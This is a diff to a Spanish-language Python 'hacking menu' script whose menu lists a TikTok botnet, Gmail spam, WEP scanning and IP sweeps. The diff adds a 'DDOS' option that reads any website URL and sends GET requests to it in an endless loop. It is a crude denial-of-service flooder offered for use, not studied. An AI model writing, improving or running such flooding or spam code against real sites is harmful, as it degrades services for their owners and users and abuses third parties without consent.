@@ -41,7 +41,7 @@ a(RR+" instagram: a30xp30")
 a(RR+" YouTube: a..x..e..l..x..s")
 print("")
 a(RR+"╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱   ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱")
-choice = int(input("1.-BOTNET  TIKTOK\n2.-ESCANEO WEP\n3.-spam de correos gmail\n4.-info de IP publica\n5.-Servidor privado http\n6.-Mi IP privada \n7.-info basica de cualquier tipo de ip \n8.-Info de un numero\n9.-Barrido de IP\n10.-BotChat\n11.-TelegramBot\n[00] Exit\nSeleccione una opsion: ")) 
+choice = int(input("1.-BOTNET  TIKTOK\n2.-ESCANEO WEP\n3.-spam de correos gmail\n4.-info de IP publica\n5.-Servidor privado http\n6.-Mi IP privada \n7.-info basica de cualquier tipo de ip \n8.-Info de un numero\n9.-Barrido de IP\n10.-BotChat\n11.-TelegramBot\n12.-DDOS\nSeleccione una opsion: ")) 
 b = 1         
 if choice == 1:
   op = int(input("1.-atake consentrado\n2.-atake bruto\nSeleccione una opsion:"))  
@@ -343,6 +343,31 @@ elif choice == 11:
    updates = bot.get_updates()
    print(updates)
    chat_id = "5170764644"
-  
-
-
+   
+elif choice == 12:
+    os.system("clear")
+    RR = "\033[36;m"
+    def a(s):
+            for c in s + '\n':
+                    sys.stdout.write(c)
+                    sys.stdout.flush()
+                    time.sleep(1./170)
+                    
+       
+    a(RR+"█▀▀▄ █▀▀▄ █▀▀█ █▀▀▀█")
+    a(RR+"█░▒█ █░▒█ █░░█ ▀▀▀▄▄")
+    a(RR+"█▄▄▀ █▄▄▀ ▀▀▀▀ █▄▄▄█ ")        
+    print ("\033[32;m")
+    
+    url = input("URL de la  wep:")
+    while True:
+        r = requests.get(url)
+        r.history
+        r.status_code
+        200
+        r.url
+        (url)
+        try:
+         print("[+]Peticion mandada a ", (url))
+        except:
+            print("[-]ERROR")
